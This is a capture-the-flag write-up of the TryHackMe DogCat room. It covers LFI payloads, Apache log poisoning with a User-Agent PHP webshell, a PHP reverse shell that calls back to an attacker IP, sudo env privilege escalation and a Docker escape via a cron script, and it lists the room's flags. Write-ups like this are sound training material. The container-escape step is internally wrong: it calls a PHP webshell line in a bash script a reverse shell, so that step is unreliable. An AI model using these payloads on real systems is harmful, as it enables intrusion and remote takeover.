# TryHackMe - DogCat Writeup

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
3. [Remote Code Execution](#remote-code-execution)
4. [Privilege Escalation](#privilege-escalation)
5. [Container Escape](#container-escape)
6. [Flags](#flags)

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oN nmap.out 10.10.174.171
```

**Open Ports:**
- **22** - SSH
- **80** - HTTP

### Initial Web Reconnaissance

The webpage allows viewing dog or cat pictures. Inspecting the URL structure reveals that a PHP script processes the `view` parameter to load pictures from either the `dogs/` or `cats/` folder.

---

## Local File Inclusion (LFI)

### Initial Bypass Attempts

Attempted basic LFI to read `/etc/passwd`:

```
http://10.10.174.171/?view=../../../../../../../etc/passwd
```

**Result:** Failed - the application validates that the `view` parameter contains either "dog" or "cat".

### Null Byte Injection

Attempted to bypass the string check using a null byte:

```
http://10.10.174.171/?view=dog%00/../../../../../../../etc/passwd
```

**Result:** Bypassed the string check but failed to open the file due to PHP appending a `.php` extension.

### Source Code Extraction

Using the PHP filter wrapper technique to extract base64-encoded source code:

```
http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog
```

Retrieved and decoded the `dog.php` source, then extracted `index.php`:

```
http://10.10.174.171/?view=php://filter/convert.base64-encode/resource=dog/../index
```

### Extracted Source Code

```php
<!DOCCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a
href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') ||
containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

### Key Vulnerability Discovery

The `ext` parameter is controllable! The application uses it as the file extension, defaulting to `.php` if not set. This allows us to bypass the `.php` extension requirement.

### Reading /etc/passwd

Exploit payload:

```
http://10.10.174.171/?view=dog/../../../../etc/passwd&ext=
```

**Result:** Successfully read the `/etc/passwd` file!

### Locating Apache Log Files

Located Apache access logs at `/var/log/apache2/access.log`. The logs include the User-Agent header from our requests.

---

## Remote Code Execution

### User-Agent Injection

Discovered that PHP code injected into the User-Agent header gets logged and can be executed through the LFI.

**Test payload (via Burp Suite):**
```
User-Agent: hello
```

**Result:** Successfully logged and accessible via:

```
http://10.10.174.171/?view=dog/../../../../var/log/apache2/access.log&ext=
```

### PHP Code Execution

Injected a PHP webshell via User-Agent:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

Now we can execute arbitrary commands:

```
http://10.10.174.171/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=id
```

**Result:** Command execution as `www-data` user!

### Reverse Shell

Generated a PHP reverse shell:

```bash
php -r '$sock=fsockopen("10.8.6.75",1337);exec("/bin/bash -i <&3 >&3 2>&3");'
```

URL encoded request:

```
http://10.10.174.171/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=php -r '$sock=fsockopen("10.8.6.75",1337);exec("/bin/bash -i <&3 >&3 2>&3");'
```

Started netcat listener on port 1337:

```bash
nc -lvnp 1337
```

**Result:** Obtained reverse shell as `www-data`!

---

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

**Result:** Found that `www-data` can execute `/usr/bin/env` as sudo without a password.

### Privilege Escalation via env

Consulted GTFOBins and found that `env` can be used to spawn a shell:

```bash
sudo /usr/bin/env /bin/sh
```

**Result:** Successfully escalated to root!

---

## Container Escape

### Discovery

Found a `.dockerenv` file in the root directory (`/root/.dockerenv`), indicating we're running inside a Docker container.

### Backup Script Analysis

Located `/opt/backups/backup.sh`:

```bash
tar cf /root/container/backup/backup.tar /root/container
```

The script backs up `/root/container` to a tar file and appears to run as a cron job. Discovered we have write permissions to this file.

### Exploitation

Overwrote `backup.sh` with a reverse shell:

```bash
<?php system($_GET['cmd']); ?>
```

Set up netcat listener on port 8888:

```bash
nc -lvnp 8888
```

**Result:** When the cron job executed, we received a root shell from the host machine!

---

## Flags

### Flag 1 (Web Shell)
```
THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
```
Found in `flag.php` in the web root directory.

### Flag 2 (LFI)
```
THM{LF1_t0_RC3_aec3fb}
```
Found in `/var/www` directory.

### Flag 3 (Privilege Escalation)
```
THM{D1ff3r3nt_3nv1ronments_874112}
```
Found in `/root` directory. Hint: "Different environments" - refers to using `env` for privesc.

### Flag 4 (Container Escape)
```
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```
Found in `/root` directory on the host machine after escaping the Docker container.

---

## Key Learnings

- **PHP LFI Techniques:** Using `php://filter/` wrappers to extract encoded source code
- **Parameter Pollution:** Exploiting controllable file extensions in PHP `include()` statements
- **Log File Injection:** Leveraging User-Agent headers that get logged and executed
- **Privilege Escalation:** Using GTFOBins to find sudo-exploitable binaries
- **Container Security:** Understanding Docker containers and escaping through cron jobs
- **Defense in Depth:** Multiple layers of escalation within a single challenge

---

**Original Author:** u/fmash16  
**Challenge:** TryHackMe - DogCat  
**Writeup Date:** 2020-2021
